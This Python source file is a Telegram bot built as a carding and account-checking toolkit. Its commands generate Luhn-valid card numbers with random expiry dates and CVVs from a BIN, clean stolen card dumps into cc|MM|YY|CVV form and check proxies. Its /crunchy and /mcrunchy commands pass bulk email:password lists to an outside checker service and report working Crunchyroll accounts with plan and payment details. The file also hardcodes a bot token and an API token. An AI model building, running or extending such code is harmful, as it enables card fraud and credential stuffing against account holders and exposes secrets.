import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import telebot
import random
import requests
import re
import os
import time

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot_token = '7560925100:AAFFkmePdsufNu3fH4DVsKRwOGkIYJMJW7A'
bot = telebot.TeleBot(bot_token)

@bot.message_handler(commands=['start'])
def start_command(message):
    # URL of the image (replace with your desired link)
    photo_url = 'https://i.ibb.co/hRftb6B/photo-2024-11-04-10-39-02-7433371809824636980.jpg'
    
    # Mention the user by their first name
    user_mention = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})"
    
    # Greeting message with user mention
    caption = (
        f"Hello, {user_mention} here! I'm thrilled to see you! 😊\n\n"
        "Whether you’re looking for tools, assistance, or just curious about what I can do, I’m ready to help!\n\n"
        "Type `/cmds` anytime to see everything I offer.\n\n"
        "Let’s make things easy and efficient—one command at a time!"
    )
    
    # Send the photo with the caption
    bot.send_photo(message.chat.id, photo_url, caption=caption, parse_mode="Markdown")


# Start polling
# Function to generate random BINs
def generate_random_bin():
    # Generate a 6-digit BIN starting with a random digit between 4 and 5 (common for Visa/Mastercard)
    first_digit = random.choice([4, 5])  # 4 for Visa, 5 for Mastercard
    bin_number = str(first_digit) + ''.join(random.choices('0123456789', k=5))
    return bin_number

# Command handler for /gbin
@bot.message_handler(commands=['gbin'])
def handle_gbin_command(message):
    try:
        # Extract the amount from the command (default to 1 if not provided or invalid)
        command_parts = message.text.split()
        if len(command_parts) > 1 and command_parts[1].isdigit():
            amount = int(command_parts[1])
        else:
            amount = 1  # Default to 1 if the input is missing or invalid
        
        # Limit the maximum amount to avoid spam (e.g., 100)
        if amount > 100:
            amount = 100
            bot.reply_to(message, "The maximum allowed amount is 100. Generating 100 BINs.")
        
        # Generate the requested number of BINs
        bins = [generate_random_bin() for _ in range(amount)]
        
        # Send the BINs as a response
        if amount <= 10:
            formatted_bins = "\n".join(f"`{bin}`" for bin in bins)
            bot.reply_to(message, f"Generated BINs:\n{formatted_bins}", parse_mode='Markdown')
        else:
            # Save the BINs to a file if there are more than 10
            with open("generated_bins.txt", "w") as file:
                file.write("\n".join(bins))
            
            with open("generated_bins.txt", "rb") as file:
                bot.send_document(message.chat.id, file)

            # Optionally, delete the file after sending it
            # os.remove("generated_bins.txt")

    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Start the bot
# Define the command handler for /bin
@bot.message_handler(commands=['bin'])
def bin_lookup(message):
    try:
        # Extract the BIN number from the message text
        bin_number = message.text.split()[1]

        # API request to fetch BIN information
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        data = response.json()

        # Check if data retrieval was successful
        if data:
            # Extracting relevant data
            card_brand = data.get('scheme', 'unknown').capitalize()  # Card brand (e.g., Visa, Mastercard)
            level = data.get('level', 'N/A')  # Card level (e.g., Platinum, Gold)
            card_type = data.get('type', 'N/A').capitalize()  # Card type (e.g., Credit, Debit)
            issuer = data.get('bank', 'N/A')  # Issuer bank name
            country_name = data.get('country_name', 'N/A')  # Country name
            country_flag = data.get('country_emoji', '')  # Country flag emoji

            # Formatting the card info
            card_info = f"{card_brand} - {level} - {card_type}"
            country = f"{country_name} {country_flag}"

            # Create the response message with monospaced formatting
            reply = (
                f"𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍\n\n"
                f"𝗕𝗜𝗡 ⇾ `{bin_number}`\n\n"
                f"𝗜𝗻𝗳𝗼 ⇾ `{card_info}`\n"
                f"𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ `{issuer}`\n"
                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ `{country}`"
            )
        else:
            reply = "No data found for the given BIN number."

        # Send the response back to the user
        bot.reply_to(message, reply, parse_mode='Markdown')

    except IndexError:
        bot.reply_to(message, "Please provide a BIN number. Usage: /bin {bin}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"Error fetching data: {e}")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Start the bot
# Dictionary to keep track of users awaiting file upload after /clean command
awaiting_files = {}

# Function to validate and reformat credit card lines
def clean_credit_card_line(line):
    # Regular expression to match formats: cc'exp'cvv, cc*exp*CVV, cc/exp/CVV, cc|exp|CVV
    match = re.match(r'^(\d{13,19})[\'*/|](\d{2})[\'*/|](\d{2})[\'*/|](\d{3,4})$', line.strip())
    if match:
        # Reformat to 'cc|MM|YY|CVV'
        return f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    return None


# Start pollin
# Start the bot
# Luhn algorithm to validate the generated card number
def luhn_check(card_number):
    total = 0
    reverse_digits = card_number[::-1]

    for i, digit in enumerate(reverse_digits):
        num = int(digit)
        if i % 2 == 1:  # Double every second digit from the right
            num *= 2
            if num > 9:
                num -= 9
        total += num

    return total % 10 == 0

# Function to generate a credit card number based on BIN
def generate_card(bin_value):
    while True:
        card_number = bin_value + ''.join([str(random.randint(0, 9)) for _ in range(16 - len(bin_value) - 1)])
        checksum_digit = (10 - sum([(2 * int(d) if i % 2 == 0 else int(d)) - 9 * ((2 * int(d)) > 9) for i, d in enumerate(card_number[-2::-1])]) % 10) % 10
        card_number += str(checksum_digit)
        
        if luhn_check(card_number):
            return card_number

# Function to generate random expiration date and CVV
def generate_exp_cvv():
    exp_month = f"{random.randint(1, 12):02}"  # Generate month in MM format
    exp_year = f"202{random.randint(5, 9)}"  # Generate year (e.g., between 2025 and 2029)
    cvv = f"{random.randint(100, 999)}"  # Generate a 3-digit CVV
    return exp_month, exp_year, cvv

# Command handler for /gen
@bot.message_handler(commands=['gen'])
def generate_cc(message):
    command_parts = message.text.split()

    if len(command_parts) != 2 or not command_parts[1].isdigit() or len(command_parts[1]) < 6:
        bot.reply_to(message, "Please provide a valid BIN using the format: /gen {bin} (minimum 6 digits)")
        return

    bin_value = command_parts[1]
    cards = []
    
    for _ in range(10):  # Generate 10 card numbers
        card_number = generate_card(bin_value)
        exp_month, exp_year, cvv = generate_exp_cvv()
        cards.append(f"`{card_number}|{exp_month}|{exp_year}|{cvv}`")

    # Send the response with each card in mono font on a new line
    response = "Here generated:\n" + '\n'.join(cards)
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# Start polling to listen for incoming messages
# Dictionary to keep track of users awaiting files for merging
awaiting_merge = {}

# Handler for the /merge command
@bot.message_handler(commands=['merge'])
def handle_merge_command(message):
    bot.reply_to(message, "Please upload the .txt files you want to merge. Send /done when you have finished uploading.")
    awaiting_merge[message.chat.id] = []

# Handler for document uploads
@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id

    # Check if the user is in the process of merging files
    if chat_id in awaiting_merge:
        # Check if the uploaded file is a .txt file
        if message.document.mime_type == 'text/plain' or message.document.file_name.endswith('.txt'):
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Save the file temporarily for merging
            filename = f"{chat_id}_merge_part_{len(awaiting_merge[chat_id]) + 1}.txt"
            with open(filename, "wb") as file:
                file.write(downloaded_file)
            
            awaiting_merge[chat_id].append(filename)
            bot.reply_to(message, f"File '{message.document.file_name}' added for merging.")
        else:
            bot.reply_to(message, "Please upload only .txt files.")

# Handler for /done command to complete the merging process
@bot.message_handler(commands=['done'])
def handle_done_command(message):
    chat_id = message.chat.id

    if chat_id in awaiting_merge and awaiting_merge[chat_id]:
        merged_content = ""
        try:
            # Read content from each file and append it
            for filename in awaiting_merge[chat_id]:
                with open(filename, "r", encoding='utf-8') as file:
                    merged_content += file.read() + "\n"
                os.remove(filename)  # Delete the temporary file after reading
            
            # Write the merged content to a new file
            merged_filename = f"merged_{chat_id}.txt"
            with open(merged_filename, "w", encoding='utf-8') as file:
                file.write(merged_content)

            with open(merged_filename, "rb") as file:
                bot.send_document(chat_id, file)

            os.remove(merged_filename)  # Delete the merged file after sending
            bot.reply_to(message, "Files have been merged successfully.")
        except Exception as e:
            bot.reply_to(message, f"An error occurred while merging the files: {e}")
        finally:
            # Clean up the user's file tracking
            del awaiting_merge[chat_id]
    else:
        bot.reply_to(message, "No files were uploaded for merging.")

# Start the bot
# Function to check if a proxy is live
def check_proxy(proxy):
    host, port, username, password = proxy.split(":")
    proxies = {
        "http": f"http://{username}:{password}@{host}:{port}",
        "https": f"http://{username}:{password}@{host}:{port}"
    }
    try:
        # Sending a request through the proxy to test
        response = requests.get("http://ipinfo.io/json", proxies=proxies, timeout=5)
        if response.status_code == 200:
            ip_info = response.json()
            ip_address = ip_info.get("ip", "Unknown IP")
            return True, ip_address
        else:
            return False, None
    except requests.RequestException:
        return False, None

# Command handler for /px
@bot.message_handler(commands=['px'])
def handle_px(message):
    # Get the command argument (the proxy)
    command_text = message.text.split(maxsplit=1)
    if len(command_text) < 2:
        bot.reply_to(
            message,
            "ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴘʀᴏxʏ ɪɴ ᴛʜᴇ ꜰᴏʀᴍᴀᴛ: ʜᴏꜱᴛ:ᴘᴏʀᴛ:ᴜꜱᴇʀɴᴀᴍᴇ:ᴘᴀꜱꜱᴡᴏʀᴅ"
        )
        return

    proxy = command_text[1].strip()
    live_proxies = []
    dead_proxies = []

    # Check if the proxy is live
    is_live, ip_address = check_proxy(proxy)
    if is_live:
        live_proxies.append(f"{proxy} -  LIVE (IP: {ip_address})")
    else:
        dead_proxies.append(proxy)

    # Prepare the response message
    if live_proxies:
        response_message = "🔗 Live Proxies:\n\n" + "\n".join(live_proxies)
    else:
        response_message = "No live proxies found."

    response_message += f"\n\n🟢 Total Live Proxies: {len(live_proxies)}"
    response_message += f"\n🔴 Total Dead Proxies: {len(dead_proxies)}"

    bot.reply_to(message, response_message)

# Start polling
# Function to split a .txt file
def split_file(file_content, num_parts):
    lines = file_content.splitlines()
    part_size = len(lines) // num_parts
    parts = []
    for i in range(num_parts):
        start_index = i * part_size
        end_index = start_index + part_size if i < num_parts - 1 else len(lines)
        part_lines = lines[start_index:end_index]
        parts.append("\n".join(part_lines))
    return parts

# Handler for the /split command
@bot.message_handler(commands=['split'])
def handle_split_command(message):
    # Check if the command is sent as a reply to a document message
    if message.reply_to_message and message.reply_to_message.document:
        command_parts = message.text.split()
        if len(command_parts) == 2 and command_parts[1].isdigit():
            num_parts = int(command_parts[1])
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_content = downloaded_file.decode('utf-8')  # Assuming UTF-8 encoding

            # Split the file content
            parts = split_file(file_content, num_parts)
            for i, part in enumerate(parts):
                filename = f"split_part_{i+1}.txt"
                with open(filename, "w") as file:
                    file.write(part)

                with open(filename, "rb") as file:
                    bot.send_document(message.chat.id, file)

                os.remove(filename)

            bot.reply_to(message, f"File has been split into {num_parts} parts.")
        else:
            bot.reply_to(message, "Please use the command like this: /split <number_of_parts>")
    else:
        bot.reply_to(message, "Please reply to a .txt file with the /split command and specify the number of parts.")

# Start the bot
@bot.message_handler(commands=['cmds'])
def display_commands(message):
    # Command list with descriptions in plain text
    commands_text = (
        "Here are the available commands:\n\n"
        "/start - Start the bot\n"
        "/ip <IP_address> - Get IP information\n"
        "/split <number_of_parts> - Split a .txt file\n"
        "/merge - Merge multiple .txt files\n" 
           
        "/gbin - Generate random BINs\n"
        "/bin - Lookup the BIN\n"
        "/gen - Generates cards from BIN\n"
        "/px - Checks proxy\n"
        "/txt <word> - Creates a .txt file\n"
        "/ping - Check bot status\n"
        "/crunchy - Checks Crunchyroll accounts\n"
        "/mcrunchy - Checks Crunchyroll accounts from a .txt file"
    )
    
    # Send the list of commands as plain text
    bot.send_message(message.chat.id, commands_text)


@bot.message_handler(commands=['txt'])
def create_txt_file(message):
    try:
        # Get the content for the .txt file
        content = message.text[len('/txt '):].strip()
        
        if not content:
            bot.reply_to(message, "Please provide some text to create a .txt file.\nUsage: /txt <your text>")
            return

        # Create a filename based on user ID and a timestamp for uniqueness
        filename = f"{message.from_user.id}_{int(time.time())}.txt"

        # Write content to the .txt file
        with open(filename, 'w') as file:
            file.write(content)

        # Send the .txt file to the user
        with open(filename, 'rb') as file:
            bot.send_document(message.chat.id, file)

        # Optionally, delete the file after sending it
        os.remove(filename)
    
    except Exception as e:
        bot.reply_to(message, f"An error occurred while creating the .txt file: {e}")



@bot.message_handler(commands=['ping'])
def ping_command(message):
    # Record the time when the command was received
    start_time = time.time()
    
    # Send a temporary message to calculate response time
    temp_message = bot.reply_to(message, "🏓Pong!!")
    
    # Calculate ping in milliseconds
    ping = int((time.time() - start_time) * 1000)
    
    # Edit the message to display the ping
    bot.edit_message_text(chat_id=message.chat.id, message_id=temp_message.message_id, 
                          text=f"🏓Pong!!\n- `{ping}` ms", parse_mode="Markdown")
                          
# Function to update the inline keyboard with buttons in pairs
# User-specific data storage 
user_data = {}
def update_inline_keyboard(chat_id, message_id, user_id):
    data = user_data.get(user_id, {'total': 0, 'good': 0, 'premium': 0, 'bad': 0})
    markup = InlineKeyboardMarkup(row_width=2)  # Set row width to 2 for pairs

    # Add buttons in pairs
    markup.add(
        InlineKeyboardButton(f"Total: {data['total']}", callback_data='total'),
        InlineKeyboardButton(f"Good: {data['good']}", callback_data='good'),
        InlineKeyboardButton(f"Premium: {data['premium']}", callback_data='premium'),
        InlineKeyboardButton(f"Bad: {data['bad']}", callback_data='bad')
    )

    bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=markup)

# Keep track of stop requests for each user
stop_requests = {}

@bot.message_handler(commands=['stop'])
def handle_stop_command(message):
    chat_id = message.chat.id
    stop_requests[chat_id] = True
    bot.reply_to(message, "Stopping all ongoing processes...")

def should_stop(chat_id):
    """Check if the user has requested to stop the process."""
    return stop_requests.get(chat_id, False)

def clear_stop_request(chat_id):
    """Clear the stop request for a user after processing ends."""
    stop_requests.pop(chat_id, None)

# Example long-running process
def process_pairs(message, pairs):
    chat_id = message.chat.id
    user_id = message.from_user.id
    user_data[user_id] = {'total': len(pairs), 'good': 0, 'premium': 0, 'bad': 0}

    sent_message = bot.send_message(chat_id, "Processing...")
    message_id = sent_message.message_id

    # Iterate through pairs with a stop check
    for pair in pairs:
        if should_stop(chat_id):
            bot.reply_to(message, "Process stopped by user request.")
            clear_stop_request(chat_id)
            return

        try:
            email, password = pair.split(':')
            # Make the request
            url = f"https://crunchy-zb1g.onrender.com/check?crunchy={email}:{password}"
            response = requests.get(url)
            response_data = response.json()
            
            # Check subscription status and classify the account
            subscription_status = response_data.get("subscription_status", "").lower()
            if "premium" in subscription_status or "free" in subscription_status:
                if "premium" in subscription_status:
                    user_data[user_id]['premium'] += 1
                else:
                    user_data[user_id]['good'] += 1

                account_info = (
                    f"Email: `{response_data.get('email', 'N/A')}`\n"
                    f"Password: `{response_data.get('password', 'N/A')}`\n"
                    f"Country: `{response_data.get('country', 'N/A')}`\n"
                    f"Payment Method: `{response_data.get('payment_method', 'N/A')}`\n"
                    f"Plan: `{response_data.get('plan', 'Unknown')}`\n"
                    f"Subscription Status: `{response_data.get('subscription_status', 'N/A')}`\n"
                    f"by: {response_data.get('by', '@kiltes')}"
                )
                
                bot.send_message(chat_id, account_info, parse_mode="Markdown")
            else:
                user_data[user_id]['bad'] += 1

            # Update the inline keyboard after each pair
            update_inline_keyboard(chat_id, message_id, user_id)
        except ValueError:
            bot.reply_to(message, f"Invalid format for: {pair}. It should be email:password.")
        except requests.exceptions.RequestException as e:
            bot.reply_to(message, f"Failed to process {pair}: {e}")

    clear_stop_request(chat_id)  # Clear stop flag after processing

# Handler for /crunchy command
@bot.message_handler(commands=['crunchy'])
def handle_crunchy(message):
    email_pass_pairs = message.text[len('/crunchy '):].strip().splitlines()
    process_pairs(message, email_pass_pairs)

# Handler for /mcrunchy command to process a .txt file with email:pass pairs
@bot.message_handler(commands=['mcrunchy'])
def handle_mcrunchy(message):
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            file = bot.download_file(file_info.file_path)
            email_pass_pairs = file.decode('utf-8').strip().splitlines()
            process_pairs(message, email_pass_pairs)
        except Exception as e:
            bot.reply_to(message, f"Failed to process file: {str(e)}")
    else:
        bot.reply_to(message, "Please reply to a TXT file with /mcrunchy to process.")

# Start the bot

IPINFO_TOKEN = "4dd04ebcd1b3c1"

@bot.message_handler(commands=['ip'])
def lookup_ip(message):
    try:
        # Extract the IP address from the command
        ip_address = message.text.split()[1]
        
        # Check if the IP address format is valid
        if not validate_ip(ip_address):
            bot.reply_to(message, "Please enter a valid IP address.")
            return

        # Query ipinfo.io API
        response = requests.get(f"https://ipinfo.io/{ip_address}?token={IPINFO_TOKEN}")
        if response.status_code == 200:
            data = response.json()
            
            # Extract relevant information
            location = data.get("loc", "N/A")
            city = data.get("city", "N/A")
            region = data.get("region", "N/A")
            country = data.get("country", "N/A")
            org = data.get("org", "N/A")
            privacy = data.get("privacy", {})

            # Privacy details
            is_vpn = privacy.get("vpn", False)
            is_proxy = privacy.get("proxy", False)
            is_tor = privacy.get("tor", False)

            # Format response
            response_message = (
                f"IP Address: {ip_address}\n"
                f"Location: {city}, {region}, {country}\n"
                f"Coordinates: {location}\n"
                f"Organization: {org}\n"
                f"VPN: {'Yes' if is_vpn else 'No'}\n"
                f"Proxy: {'Yes' if is_proxy else 'No'}\n"
                f"TOR: {'Yes' if is_tor else 'No'}"
            )
            
            # Send the information back to the user
            bot.reply_to(message, response_message)
        else:
            bot.reply_to(message, "Could not retrieve data for this IP address. Please try again later.")
    except IndexError:
        bot.reply_to(message, "Please provide an IP address in the format: /ip <ip_address>")
    except Exception as e:
        bot.reply_to(message, "An error occurred. Please try again later.")

def validate_ip(ip):
    # Basic validation for an IPv4 address
    parts = ip.split(".")
    if len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
        return True
    return False

# Start polling for messages

bot.polling()





